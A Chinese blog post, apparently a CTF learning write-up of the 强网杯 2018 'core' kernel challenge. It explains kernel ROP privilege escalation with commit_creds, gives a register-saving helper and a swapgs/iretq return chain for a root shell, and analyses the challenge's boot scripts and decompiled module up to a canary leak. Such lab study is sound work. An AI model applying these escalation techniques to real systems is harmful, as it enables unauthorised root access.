<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>kernel学习笔记1 | ixout's blog</title><meta name="author" content="ixout"><meta name="copyright" content="ixout"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="从两道例题初步理解内核pwn">
<meta property="og:type" content="article">
<meta property="og:title" content="kernel学习笔记1">
<meta property="og:url" content="https://ixout.github.io/posts/13785/index.html">
<meta property="og:site_name" content="ixout&#39;s blog">
<meta property="og:description" content="从两道例题初步理解内核pwn">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/indeximg.jpg">
<meta property="article:published_time" content="2023-12-28T08:25:43.000Z">
<meta property="article:modified_time" content="2024-03-17T12:25:34.743Z">
<meta property="article:author" content="ixout">
<meta property="article:tag" content="kernel">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/indeximg.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ixout.github.io/posts/13785/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'kernel学习笔记1',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-03-17 20:25:34'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/mainColor/heoMainColor.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/poem.css"><link rel="stylesheet" href="/css/footerb.css"><link rel="stylesheet" href="/css/bolang.css"><link rel="stylesheet" href="/css/jzbar.css"><link rel="stylesheet" href="/css/trans.css"><link rel="stylesheet" href="/css/gundongtiao.css"><link rel="stylesheet" href="/css/shubiao.css"><link rel="stylesheet" href="/css/fengche.css"><link rel="stylesheet" href="/css/alitubiao.css"><link rel="stylesheet" href="/css/fps.css"><span id="fps"></span><link rel="stylesheet" href="/css/yituliu.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.css" media="defer" onload="this.media='all'"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ixout's blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="pokeball-back"></div><div class="pokeball-loading"><div class="pokeball" id="pokeball-normal"></div><div class="pokeball" id="pokeball-great"></div><div class="pokeball" id="pokeball-ultra"></div><div class="pokeball" id="pokeball-master"></div><div class="pokeball" id="pokeball-safari"></div></div></div><script async="async">const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
document.getElementById('loading-box').addEventListener('click',()=> {preloader.endLoading()})
setTimeout(function(){preloader.endLoading();}, 7000);

if (false) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="/css/jzbar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">51</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">56</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-fenlei"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/indeximg.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="ixout's blog"><span class="site-name">ixout's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-fenlei"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">kernel学习笔记1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-28T08:25:43.000Z" title="发表于 2023-12-28 16:25:43">2023-12-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-17T12:25:34.743Z" title="更新于 2024-03-17 20:25:34">2024-03-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">9.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>40分钟</span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="强网杯-2018-core"><a href="#强网杯-2018-core" class="headerlink" title="强网杯 2018 - core"></a>强网杯 2018 - core</h1><h2 id="Kernel-ROP"><a href="#Kernel-ROP" class="headerlink" title="Kernel ROP"></a>Kernel ROP</h2><p><strong>内核态的 ROP 与用户态的 ROP 一般无二，只不过利用的 gadget 变成了内核中的 gadget，所需要构造执行的 ropchain 由</strong> <code>system(&quot;/bin/sh&quot;)</code> <strong>变为了</strong> <code>commit_creds(&amp;init_cred)</code> 或 <code>commit_creds(prepare_kernel_cred(NULL))</code>，当我们成功地在内核中执行这样的代码后，当前线程的 cred 结构体便变为 init 进程的 cred 的拷贝，我们也就获得了 root 权限，此时在用户态起一个 shell 便能获得 root shell。</p>
<h3 id="状态保存"><a href="#状态保存" class="headerlink" title="状态保存"></a>状态保存</h3><p>通常情况下，我们的 exploit 需要进入到内核当中完成提权，而我们最终仍然需要<strong>着陆回用户态</strong>以获得一个 root 权限的 shell，因此在我们的 exploit 进入内核态之前我们需要<strong>手动模拟用户态进入内核态的准备工作</strong>——<strong>保存各寄存器的值到内核栈上</strong>，以便于后续着陆回用户态。</p>
<p>通常情况下使用如下函数保存各寄存器值到我们自己定义的变量中，以便于构造 rop 链：</p>
<blockquote>
<p>算是一个通用的 pwn 板子。</p>
<p>方便起见，使用了内联汇编，编译时需要指定参数：<code>-masm=intel</code>。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="返回用户态"><a href="#返回用户态" class="headerlink" title="返回用户态"></a>返回用户态</h3><p>由内核态返回用户态只需要：</p>
<ul>
<li><code>swapgs</code>指令恢复用户态 GS 寄存器</li>
<li><code>sysretq</code>或者<code>iretq</code>恢复到用户空间</li>
</ul>
<p>那么我们只需要在内核中找到相应的 gadget 并执行<code>swapgs;iretq</code>就可以成功着陆回用户态。</p>
<p>通常来说，我们应当构造如下 rop 链以返回用户态并获得一个 shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">↓   swapgs</span><br><span class="line">    iretq</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_eflags //64bit user_rflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure>
<h3 id="swapgs"><a href="#swapgs" class="headerlink" title="swapgs"></a>swapgs</h3><p>交换内核态与用户态的gs寄存器</p>
<h3 id="iretq-amp-amp-sysretq"><a href="#iretq-amp-amp-sysretq" class="headerlink" title="iretq&amp;&amp;sysretq"></a>iretq&amp;&amp;sysretq</h3><p>这两个指令都是用于返回用户态</p>
<p>其中iretq等效</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rip</span><br><span class="line">pop cs</span><br><span class="line">pop rflags</span><br><span class="line">pop rsp</span><br><span class="line">pop ss</span><br></pre></td></tr></table></figure>
<p>sysretq则等效</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rip</span><br></pre></td></tr></table></figure>
<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><p>首先文件解压出来提供了四个文件,bzImage,core.cpio,start.sh和vmlinux</p>
<p>其中bzImage是压缩后的内核镜像,去除了大多数的调试符号</p>
<p>core.cpio是提供给内核的文件系统</p>
<p>start.sh是启动内核的脚本</p>
<p>vmlinux则是未经过压缩的静态链接的内核镜像,其中具有更多的调试符号,更利于调试,如果没有这个文件可以利用linus提供的<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a>脚本从bzImage中分离出来</p>
<p>观察以下start.sh启动脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">     │ File: ./start.sh</span><br><span class="line">───────┼────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ qemu-system-x86_64 \</span><br><span class="line">   2   │ -m 256M \</span><br><span class="line">   3   │ -kernel ./bzImage \#指定内核镜像</span><br><span class="line">   4   │ -initrd  ./core.cpio \#指定初始的根文件系统</span><br><span class="line">   5   │ -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">   6   │ -s  \#开启调试</span><br><span class="line">   7   │ -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">   8   │ -nographic  \#不使用图形化界面</span><br></pre></td></tr></table></figure>
<p><code>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</code></p>
<ul>
<li><code>quiet</code>: 禁用一些冗长的启动消息，以使启动过程更为静默。</li>
<li><code>kaslr</code>: 表示启用内核地址空间随机化</li>
</ul>
<p>解压core.cpio后看一下其中的init文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">───────┬─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: init</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ #!/bin/sh</span><br><span class="line">   2   │ mount -t proc proc /proc</span><br><span class="line">   3   │ mount -t sysfs sysfs /sys</span><br><span class="line">   4   │ mount -t devtmpfs none /dev</span><br><span class="line">   5   │ /sbin/mdev -s</span><br><span class="line">   6   │ mkdir -p /dev/pts</span><br><span class="line">   7   │ mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">   8   │ chmod 666 /dev/ptmx</span><br><span class="line">   9   │ cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">  10   │ echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">  11   │ echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">  12   │ ifconfig eth0 up</span><br><span class="line">  13   │ udhcpc -i eth0</span><br><span class="line">  14   │ ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">  15   │ route add default gw 10.0.2.2 </span><br><span class="line">  16   │ insmod /core.ko</span><br><span class="line">  17   │ </span><br><span class="line">  18   │ #poweroff -d 120 -f &amp;</span><br><span class="line">  19   │ setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">  20   │ echo &#x27;sh end!\n&#x27;</span><br><span class="line">  21   │ umount /proc</span><br><span class="line">  22   │ umount /sys</span><br><span class="line">  23   │ </span><br><span class="line">  24   │ #poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>mount</code>命令用于挂载文件系统</p>
<ul>
<li><code>-t</code>选项指定挂载文件系统类型</li>
<li><code>-o</code>挂载选项</li>
</ul>
<p>例如<code>mount -vt devpts -o gid=4,mode=620 none /dev/pts</code>,将<code>devpts</code>文件系统挂载到<code>/dev/pts</code>目录,使用<code>none</code>作为源设备,即不需要源设备文件,挂载的目录的属性为<code>组别4,权限是620</code></p>
</li>
<li><p><code>/sbin/mdev</code>是一个轻量级的设备管理工具，通常用于嵌入式 Linux 系统中，用于在系统启动时自动创建和管理设备节点。</p>
<ul>
<li><code>-s</code>  ,用于启用 <code>mdev</code> 的守护进程（daemon）模式</li>
</ul>
<p>当运行 <code>/sbin/mdev -s</code> 时，<code>mdev</code> 将以守护进程的形式运行，并在后台监听设备的变化。</p>
</li>
<li><p><code>ifconfig eth0 up</code> 是一个 Linux 命令，用于启用(激活)网络接口</p>
</li>
<li><p><code>umount</code>与<code>mount</code>相反,卸载挂载的文件系统</p>
</li>
<li><p><code>setuidgid</code> 是一个busybox提供的一个工具，用于以指定的用户ID启动程序。</p>
</li>
<li><p><code>setsid</code>是一个 Unix/Linux 命令，用于启动一个新的会话。这个命令将当前进程设置为新会话的领头进程（session leader）。通常，<code>setsid</code> 用于创建一个与父进程和之前的会话完全脱离的新会话，这对于将进程变成守护进程很有用，因为它与原始终端会话无关。</p>
<p><code>setsid /bin/cttyhack setuidgid 1000 /bin/sh</code>作用是创建一个新的会话，执行 <code>/bin/cttyhack</code> 工具，然后以用户 ID 1000 的身份启动 <code>/bin/sh</code> shell</p>
</li>
<li><p><code>insomod</code>的作用是加载驱动模块,加载后的驱动模块会出现在<code>/sys/module/</code>中</p>
</li>
</ul>
<p>init中比较重要的几点是</p>
<ul>
<li>第 9 行中把 <code>kallsyms</code> 的内容保存到了 <code>/tmp/kallsyms</code> 中，那么我们就能从 <code>/tmp/kallsyms</code> 中读取 <code>commit_creds</code>，<code>prepare_kernel_cred</code> 的函数的地址了</li>
<li>第 10 行把 <code>kptr_restrict</code> 设为 1，这样就不能通过 <code>/proc/kallsyms</code> 查看函数地址了，但第 9 行已经把其中的信息保存到了一个可读的文件中，这句就无关紧要了</li>
<li>第 11 行把 <code>dmesg_restrict</code> 设为 1，这样就不能通过 <code>dmesg</code> 查看 kernel 的信息了</li>
</ul>
<h2 id="模块分析"><a href="#模块分析" class="headerlink" title="模块分析"></a>模块分析</h2><p>检查一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/core/core/core.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>
<p>存在canary,ida进一步静态分析</p>
<p>存在七个主要函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">core_release	.text	<span class="number">0000000000000000</span>	<span class="number">00000011</span>	<span class="number">00000000</span></span><br><span class="line">core_write	.text	<span class="number">0000000000000011</span>	<span class="number">00000052</span>	<span class="number">00000010</span></span><br><span class="line">core_read	.text	<span class="number">0000000000000063</span>	<span class="number">00000093</span>	<span class="number">00000050</span></span><br><span class="line">core_copy_func	.text	<span class="number">00000000000000F</span>6	<span class="number">00000069</span>	<span class="number">00000050</span></span><br><span class="line">core_ioctl	.text	<span class="number">000000000000015F</span>	<span class="number">0000005</span>A	<span class="number">00000008</span></span><br><span class="line">init_module	.init.text	<span class="number">00000000000001B</span>9	<span class="number">00000032</span>	<span class="number">00000000</span></span><br><span class="line">exit_core	.<span class="built_in">exit</span>.text	<span class="number">00000000000001</span>EB	<span class="number">00000019</span>	<span class="number">00000000</span></span><br></pre></td></tr></table></figure>
<p><strong>init_module()</strong> 注册了 <code>/proc/core</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: created /proc/core entry\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>exit_core()</strong> 删除 <code>/proc/core</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">exit_core</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( core_proc )</span><br><span class="line">    result = remove_proc_entry(<span class="string">&quot;core&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>core_ioctl()</strong> 定义了三条命令，分别调用 <strong>core_read()</strong>，<strong>core_copy_func()</strong> 和设置全局变量 <strong>off</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109787</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109788</span>:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = a3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109786</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>core_read()</strong> 从 <code>v4[off]</code> 拷贝 64 个字节到用户空间，但要注意的是全局变量 <code>off</code> 使我们能够控制的，因此可以合理的控制 <code>off</code> 来 leak canary 和一些地址</p>
